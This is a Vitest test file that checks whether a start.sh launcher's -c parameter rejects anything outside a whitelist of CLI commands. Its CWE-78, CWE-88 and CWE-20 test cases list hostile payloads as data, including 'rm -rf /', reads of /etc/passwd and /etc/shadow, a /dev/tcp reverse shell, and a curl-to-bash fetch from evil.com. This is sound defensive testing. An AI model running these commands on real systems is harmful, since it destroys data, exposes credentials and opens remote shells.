// Copyright (c) 2025-2026 Huawei Technologies Co., Ltd.
// This program is free software, you can redistribute it and/or modify it under the terms and conditions of
// CANN Open Software License Agreement Version 2.0 (the "License").
// Please refer to the License for details. You may not use this file except in compliance with the License.
// THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED,
// INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY, OR FITNESS FOR A PARTICULAR PURPOSE.
// See LICENSE in the root of the software repository for the full text of the License.

import { describe, it, expect } from 'vitest';
import { execSync } from 'node:child_process';
import path from 'node:path';

const PROJECT_ROOT = path.resolve(__dirname, '..');
const START_SH = path.join(PROJECT_ROOT, 'start.sh');

const ALLOWED_COMMANDS = ['tui', 'sessions', 'session', 'turn', 'search', 'compare', 'stats', 'import', 'delete', 'config'];

function isValidCliCmd(input: string): boolean {
  if (!input) return false;
  return ALLOWED_COMMANDS.includes(input);
}

function runStartSh(cliArg: string): { exitCode: number; stderr: string } {
  try {
    execSync(`bash "${START_SH}" -c '${cliArg.replace(/'/g, "'\\''")}'`, {
      timeout: 5000,
      encoding: 'utf-8',
      stdio: 'pipe',
    });
    return { exitCode: 0, stderr: '' };
  } catch (err: any) {
    return {
      exitCode: err.status ?? 1,
      stderr: err.stderr ?? '',
    };
  }
}

describe('start.sh -c parameter validation', () => {
  describe('whitelist logic: exact string match', () => {
    for (const cmd of ALLOWED_COMMANDS) {
      it(`accepts: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(true);
      });
    }

    it('rejects empty string', () => {
      expect(isValidCliCmd('')).toBe(false);
    });

    const invalid = ['foo', 'bash', 'sh', 'exec', 'eval', 'run', 'npm', 'node'];
    for (const cmd of invalid) {
      it(`rejects unknown: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(false);
      });
    }
  });

  describe('CWE-78: shell metacharacter injection', () => {
    const payloads = [
      'tui;rm -rf /',
      'tui ; cat /etc/passwd',
      'tui;;echo hacked',
      'tui|cat /etc/passwd',
      'tui||rm -rf /',
      'tui&&whoami',
      'tui`whoami`',
      'tui$(whoami)',
      'tui&sleep 100',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-88: argument delimiter injection', () => {
    const payloads = [
      'tui --server http://evil.com',
      'tui --evil-flag',
      'tui=evil',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-20: input validation edge cases', () => {
    const payloads = [
      '../etc/passwd',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      'curl http://evil.com/shell.sh|bash',
      'echo d2hvYW1p | base64 -d | bash',
      'tui$(cat /etc/shadow)',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('integration: start.sh rejects malicious -c and exits 1', () => {
    const rejectPayloads = [
      'tui;rm -rf /',
      'tui|cat /etc/passwd',
      'tui&&whoami',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      'foo',
    ];
    for (const payload of rejectPayloads) {
      it(`start.sh exits 1 for: ${payload}`, () => {
        const result = runStartSh(payload);
        expect(result.exitCode).toBe(1);
        expect(result.stderr).toContain('Invalid CLI command');
      });
    }
  });
});
